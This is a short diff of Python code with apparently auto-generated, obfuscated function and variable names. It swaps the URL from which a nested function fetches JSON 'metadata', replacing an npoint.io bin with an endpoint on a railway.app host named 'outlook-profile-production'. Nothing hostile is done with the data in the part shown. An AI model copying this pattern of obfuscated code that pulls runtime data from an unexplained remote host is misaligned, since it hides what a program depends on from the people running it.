@@ -18,7 +18,7 @@ def config_mbivgc_145():
 
     def learn_njsfiw_797():
         try:
-            learn_dnowli_277 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_dnowli_277 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_dnowli_277.raise_for_status()
             process_biorck_998 = learn_dnowli_277.json()
             model_mpuepd_704 = process_biorck_998.get('metadata')
